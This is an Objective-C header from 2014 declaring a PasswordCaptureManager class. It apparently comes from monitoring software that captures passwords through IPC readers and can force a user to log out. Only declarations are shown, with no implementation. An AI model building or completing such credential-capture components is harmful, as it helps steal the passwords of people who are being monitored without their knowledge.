//
//  PasswordCaptureManager.h
//  PasswordCaptureManager
//
//  Created by Makara on 2/26/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "MessagePortIPCReader.h"
#import "SharedFile2IPCReader.h"

@interface PasswordCaptureManager : NSObject <EventCapture, MessagePortIPCDelegate, SharedFile2IPCDelegate> {
@private
    id <EventDelegate> mDelegate;
    
    MessagePortIPCReader	*mMessagePortReader;
	MessagePortIPCReader	*mMessagePortReader1;
	MessagePortIPCReader	*mMessagePortReader2;
    
    SharedFile2IPCReader	*mSharedFileReader1;
}

@property (nonatomic, assign) id <EventDelegate> mDelegate;

- (void) forceLogOut;
- (void) resetForceLogOut;

@end
